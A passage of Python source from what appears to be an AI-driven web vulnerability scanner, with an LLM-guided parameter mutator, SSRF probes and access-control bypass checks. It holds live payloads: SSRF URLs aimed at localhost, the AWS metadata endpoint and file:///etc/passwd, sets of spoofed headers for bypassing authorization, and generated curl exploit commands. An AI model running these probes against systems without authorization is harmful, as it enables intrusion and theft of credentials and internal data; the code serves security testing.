      "reason": "why this mutation might reveal a vulnerability"
    }}
  ],
  "risk_assessment": "what stands out about this endpoint"
}}"""
        ai_result = self.ai._call(prompt, cache=False)
        if not ai_result or not ai_result.get("mutations"):
            return

        mutations = ai_result.get("mutations", [])
        for mut in mutations[:5]:
            mut_type = mut.get("type", "")
            param = mut.get("param", "")
            mutated = mut.get("mutated_value", "")
            reason = mut.get("reason", "")

            if not param or not mutated:
                continue

            # Execute mutation
            test_params = dict(ep.params)
            if param in test_params:
                test_params[param] = mutated
            elif param.lower() in [k.lower() for k in test_params]:
                for k in test_params:
                    if k.lower() == param.lower():
                        test_params[k] = mutated
                        break
            else:
                # Header or new param — BAC/auth bypass via headers
                if mut_type == "bac" or mut_type == "auth_bypass":
                    resp = client.get(ep.url, extra_headers={param: mutated})
                    if resp.get("status") == 200 and orig_resp.get("status") in (401, 403):
                        bypass_body = resp.get("body", "")
                        orig_body = orig_resp.get("body", "")
                        # Skip if response is identical to original (same public page)
                        if hashlib.md5(bypass_body.encode()).hexdigest() == hashlib.md5(orig_body.encode()).hexdigest():
                            continue
                        # Check for actual sensitive data
                        sens_keys = RiskScorer.score_body(bypass_body)
                        has_sensitive = bool(sens_keys)
                        # Login/error page without sensitive data = not a real bypass
                        is_login_page = any(k in bypass_body.lower() for k in
                            ["<input", "password", "login", "sign in", "log in"])
                        if is_login_page and not has_sensitive:
                            continue
                        if len(bypass_body) < 50:
                            continue
                        conf = 85 if has_sensitive else 60
                        with self._lock:
                            self.findings.append(Finding(
                                owasp_id="A01", owasp_name="Broken Access Control",
                                title=f"AI Repeater: Auth bypass via {param} header",
                                risk="High", confidence=conf,
                                url=ep.url, method="GET", param=f"header:{param}",
                                payload=mutated,
                                evidence=(
                                    f"{reason}. Status {orig_resp.get('status')}→{resp['status']}. "
                                    + (f"Sensitive data: {[s['key'] for s in sens_keys[:5]]}" if has_sensitive
                                       else "Response body differs from public page.")
                                ),
                                baseline_diff=f"Without header: {orig_resp.get('status')}, With: {resp['status']}",
                                tool_output=bypass_body[:2000],
                                request_raw=f"GET {ep.url}\n{param}: {mutated}",
                                response_raw=bypass_body[:2000],
                                exploit_cmd=f"curl -H '{param}: {mutated}' '{ep.url}'",
                                remediation="Do not rely on client-provided headers for access control.",
                                confirmed=has_sensitive, tool="mitmproxy_interceptor",
                            ))
                    continue

            # Parameter mutation request
            if ep.method == "GET":
                parsed = urllib.parse.urlparse(ep.url)
                qs = dict(urllib.parse.parse_qsl(parsed.query))
                qs.update({param: mutated})
                test_url = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(qs)))
                mut_resp = client.get(test_url)
            else:
                mut_resp = client.post(ep.url, data=test_params)

            # AI response comparison
            if mut_resp.get("status") != orig_resp.get("status") or \
               abs(len(mut_resp.get("body", "")) - len(orig_resp.get("body", ""))) > 100:
                # Interesting diff — have AI compare
                cmp_prompt = f"""Compare these two HTTP responses. Did the mutation reveal a vulnerability?

ORIGINAL: status={orig_resp.get('status')}, body_size={len(orig_resp.get('body',''))}
MUTATED:  status={mut_resp.get('status')}, body_size={len(mut_resp.get('body',''))}
Mutation: {param}='{mutated}' (was: {mut.get('original_value','')})
Type: {mut_type}
Reason: {reason}

Mutated response body (first 300 chars):
{mut_resp.get('body','')[:300]}

Return JSON: {{"is_vuln": false, "risk": "Medium", "evidence": "what changed", "confidence": 0}}"""
                cmp_result = self.ai._call(cmp_prompt, cache=False) or {}
                if cmp_result.get("is_vuln") and cmp_result.get("confidence", 0) >= MIN_CONFIDENCE:
                    owasp_map = {"idor": "A01", "bac": "A01", "ssrf": "A10",
                                 "auth_bypass": "A07", "param_tamper": "A03"}
                    with self._lock:
                        self.findings.append(Finding(
                            owasp_id=owasp_map.get(mut_type, "A01"),
                            owasp_name="Broken Access Control",
                            title=f"AI Repeater [{mut_type}]: {ep.url} param={param}",
                            risk=cmp_result.get("risk", "Medium"),
                            confidence=cmp_result.get("confidence", 55),
                            url=ep.url, method=ep.method, param=param,
                            payload=mutated,
                            evidence=cmp_result.get("evidence", reason),
                            baseline_diff=f"Original: {orig_resp.get('status')}, Mutated: {mut_resp.get('status')}",
                            tool_output=mut_resp.get("body", "")[:300],
                            request_raw=f"{ep.method} {ep.url}\n{param}={mutated}",
                            response_raw=mut_resp.get("body", "")[:200],
                            exploit_cmd=f"curl '{ep.url}?{param}={mutated}'" if ep.method == "GET" else f"curl -X POST -d '{param}={mutated}' '{ep.url}'",
                            remediation=f"Validate {param} server-side.",
                            tool="mitmproxy_interceptor",
                        ))

    def _check_ssrf_params(self, client: "HTTPClient", ep: "Endpoint", orig_resp: dict):
        """Check URL parameters for SSRF."""
        ssrf_params = ["url", "redirect", "next", "return", "callback", "dest",
                       "target", "src", "load", "fetch", "path", "uri",
                       "endpoint", "proxy", "link", "href", "file", "reference"]

        for param, value in ep.params.items():
            param_lower = param.lower().split(":")[-1]
            if param_lower not in ssrf_params:
                continue

            # Internal service SSRF payloads
            ssrf_tests = [
                ("localhost", "http://127.0.0.1/"),
                ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
                ("internal_port", "http://127.0.0.1:8080/"),
                ("file_proto", "file:///etc/passwd"),
            ]

            for test_name, payload in ssrf_tests:
                if ep.method == "GET":
                    parsed = urllib.parse.urlparse(ep.url)
                    qs = dict(urllib.parse.parse_qsl(parsed.query))
                    qs[param_lower] = payload
                    test_url = urllib.parse.urlunparse(parsed._replace(
                        query=urllib.parse.urlencode(qs)))
                    test_resp = client.get(test_url)
                else:
                    test_params = dict(ep.params)
                    test_params[param] = payload
                    test_resp = client.post(ep.url, data=test_params)

                body = test_resp.get("body", "").lower()
                # SSRF indicators — require concrete evidence of internal access
                ssrf_indicators = [
                    "root:" in body and "/bin/" in body,  # /etc/passwd
                    "ami-id" in body or "instance-id" in body,  # AWS metadata
                    "internal server" in body and test_resp.get("status") == 500,
                ]
                # Generic size diff only counts if response contains internal/sensitive markers
                if (len(body) > 100 and test_resp.get("status") == 200 and
                    abs(len(body) - len(orig_resp.get("body", ""))) > 200):
                    sens_keys = RiskScorer.score_body(body)
                    internal_markers = any(m in body for m in [
                        "localhost", "127.0.0.1", "internal", "private",
                        "root:", "admin", "config", "secret",
                    ])
                    if sens_keys or internal_markers:
                        ssrf_indicators.append(True)
                if any(ssrf_indicators):
                    with self._lock:
                        self.findings.append(Finding(
                            owasp_id="A10", owasp_name="SSRF",
                            title=f"SSRF via {param}: {ep.url} [{test_name}]",
                            risk="Critical" if "metadata" in test_name else "High",
                            confidence=85,
                            url=ep.url, method=ep.method, param=param,
                            payload=payload,
                            evidence=f"SSRF indicator found with payload {test_name}",
                            baseline_diff=f"Original size: {len(orig_resp.get('body',''))}, SSRF: {len(body)}",
                            tool_output=body[:400],
                            request_raw=f"{ep.method} {ep.url}\n{param}={payload}",
                            response_raw=body[:300],
                            exploit_cmd=f"curl '{ep.url}?{param_lower}={payload}'",
                            remediation="Whitelist allowed URLs/domains. Block internal IPs.",
                            confirmed=True, tool="mitmproxy_interceptor",
                        ))
                    break  # One finding per param is enough

    def _check_bac_manipulation(self, client: "HTTPClient", ep: "Endpoint", orig_resp: dict):
        """Role/auth header manipulation — verify actual exploitation, not just status change."""
        if orig_resp.get("status") not in (401, 403):
            return

        bac_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Original-URL": urllib.parse.urlparse(ep.url).path},
            {"X-Rewrite-URL": urllib.parse.urlparse(ep.url).path},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "localhost"},
            {"Referer": ep.url.replace(urllib.parse.urlparse(ep.url).path, "/admin")},
        ]

        # Fetch public baseline to compare against bypass response
        clean_resp = client.get(ep.url)
        clean_body = clean_resp.get("body", "")
        clean_hash = hashlib.md5(clean_body.encode()).hexdigest()

        for headers in bac_headers:
            resp = client.get(ep.url, extra_headers=headers)
            if resp.get("status") in (200, 201, 202) and orig_resp.get("status") in (401, 403):
                header_name = list(headers.keys())[0]
                header_val = list(headers.values())[0]
                bypass_body = resp.get("body", "")
                bypass_hash = hashlib.md5(bypass_body.encode()).hexdigest()

                # Skip if response is identical to public page (e.g. login page always returns 200)
                if bypass_hash == clean_hash:
                    continue
                # Skip if body size is very similar and title matches — same public page
                clean_title = re.search(r'<title>([^<]+)</title>', clean_body, re.I)
                bypass_title = re.search(r'<title>([^<]+)</title>', bypass_body, re.I)
                if (abs(len(bypass_body) - len(clean_body)) < 100 and
                    clean_title and bypass_title and
                    clean_title.group(1).strip() == bypass_title.group(1).strip()):
                    continue

                # Check for actual sensitive data in the bypass response
                sens_keys = RiskScorer.score_body(bypass_body)
                has_sensitive = bool(sens_keys)
                # Login page with no sensitive data = not a real bypass
                is_login_page = any(k in bypass_body.lower() for k in
                    ["<input", "password", "login", "sign in", "log in"])
                if is_login_page and not has_sensitive:
                    continue

                conf = 85 if has_sensitive else 60
                with self._lock:
                    self.findings.append(Finding(
                        owasp_id="A01", owasp_name="Broken Access Control",
                        title=f"Interceptor BAC Bypass: {header_name} → {ep.url}",
                        risk="High", confidence=conf,
                        url=ep.url, method="GET", param=f"header:{header_name}",
                        payload=header_val,
                        evidence=(
                            f"Status {orig_resp['status']}→{resp['status']} with {header_name}:{header_val}. "
                            f"Response differs from public page (size: {len(clean_body)}→{len(bypass_body)}). "
                            + (f"Sensitive data: {[s['key'] for s in sens_keys[:5]]}" if has_sensitive
                               else "Response body differs from public page.")
                        ),
                        baseline_diff=f"Original: {orig_resp['status']}, Bypassed: {resp['status']}",
                        tool_output=bypass_body[:2000],
                        request_raw=f"GET {ep.url}\n{header_name}: {header_val}",
                        response_raw=bypass_body[:2000],
                        exploit_cmd=f"curl -H '{header_name}: {header_val}' '{ep.url}'",
                        remediation=f"Do not trust {header_name} for authorization.",
                        confirmed=has_sensitive, tool="mitmproxy_interceptor",
                    ))
                return  # One bypass found is enough

    def _cross_flow_analysis(self):
        """Cross-analyze all flows with AI."""
        if len(self.flow_log) < 3:
            return

        # Session consistency check
        urls_with_auth = [f for f in self.flow_log if f.get("status") == 200]
        urls_without_auth = [f for f in self.flow_log if f.get("status") in (401, 403)]

        if urls_with_auth and urls_without_auth:
            summary = {
                "accessible": [{"url": f["url"], "status": f["status"]} for f in urls_with_auth[:10]],
                "restricted": [{"url": f["url"], "status": f["status"]} for f in urls_without_auth[:10]],
                "total_flows": len(self.flow_log),
            }
            prompt = f"""Analyze these intercepted HTTP flows for access control patterns.

{json.dumps(summary, indent=2)}

Look for:
1. Inconsistent access control (similar paths, different auth requirements)
2. Horizontal privilege escalation patterns
3. Missing auth on sensitive endpoints

Return JSON: {{"patterns": [{{"issue":"...","urls":["..."],"risk":"High","confidence":70}}]}}"""
            result = self.ai._call(prompt, cache=False) or {}
            for pattern in result.get("patterns", [])[:3]:
                if pattern.get("confidence", 0) >= MIN_CONFIDENCE:
                    with self._lock:
                        self.findings.append(Finding(
                            owasp_id="A01", owasp_name="Broken Access Control",
                            title=f"Interceptor Pattern: {pattern.get('issue', 'AC inconsistency')[:60]}",
                            risk=pattern.get("risk", "Medium"),
                            confidence=pattern.get("confidence", 55),
                            url=pattern.get("urls", [self.target])[0] if pattern.get("urls") else self.target,
                            method="GET", param="access_control_pattern",
                            payload="Cross-flow analysis",
                            evidence=pattern.get("issue", ""),
                            baseline_diff="cross_flow_analysis",
                            tool_output=json.dumps(summary)[:400],
                            request_raw="Multiple intercepted flows",
                            response_raw="",
                            exploit_cmd="", remediation="Review access control consistency.",
                            tool="mitmproxy_interceptor",
                        ))

__all__ = ['ReconResult', 'ReconEngine', 'OOBClient', 'MitmProxyInterceptor']
